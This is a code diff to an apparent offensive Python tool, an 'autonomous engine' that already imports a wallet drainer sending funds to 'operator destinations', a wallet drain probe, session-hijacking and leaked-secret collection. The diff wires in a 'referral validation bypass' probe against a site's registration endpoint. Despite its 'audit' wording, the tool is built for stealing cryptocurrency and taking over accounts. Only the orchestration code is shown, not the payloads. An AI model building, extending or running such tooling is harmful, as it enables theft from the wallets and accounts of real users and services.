@@ -10,6 +10,7 @@ Features:
 - HTTP/2 single-packet concurrency engine integration for race condition logic fuzzing
 - Active Multi-Chain Liquidity Auditor & Transaction Signer/Broadcaster integration
 - Automated Wallet Drain Probe Integration using operator destinations from drainer.py
+- Automated Referral Validation Gateway Fuzzing Integration (test_referral.py)
 - Zero-disk in-memory intelligence collection & live telemetry streaming
 """
 import asyncio
@@ -33,6 +34,9 @@ from modules.live_login_verifier import execute_live_login_verification
 from modules.drainer import run_drainer_engine, OPERATOR_DESTINATIONS
 from modules.wallet_drain_probe import execute_probe
 from modules.telemetry import stream_proof
+
+# Import the referral validation bypass probe
+from test_referral import audit_referral_logic
 
 # ============================================================
 # CONFIGURATION
@@ -344,7 +348,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         if isinstance(recon_data, dict):
             discovered_paths = recon_data.get("endpoints", [])
             leaked_secrets = recon_data.get("leaked_secrets", {})
-            bola_vulnerabilities = recon_data.get("bola_vulnerabilities", [])
+            bola_vulnerabilities = recon_data.get("bola_vulnerabilities", {})
     except Exception as exc:
         warning(f"State-machine crawler encountered an issue: {exc}. Falling back to default list.")
 
@@ -355,6 +359,14 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         success("Propagating active operator session cookie across transport layer.")
         session_pool.cookie_jar.update(transport.cookie_jar)
         verify_hijacked_session(transport, "/dashboard")
+
+    # Dispatch Referral Gateway Validation Probe against /user/register
+    section("REFERRAL GATEWAY VALIDATION AUDIT")
+    try:
+        info("Dispatching referral validation bypass audit against /user/register...")
+        await asyncio.to_thread(audit_referral_logic)
+    except Exception as exc:
+        warning(f"Referral audit probe encountered an issue: {exc}")
 
     if leaked_secrets:
         warning(f"Discovered potential leaked JSON codes/tokens: {leaked_secrets}")
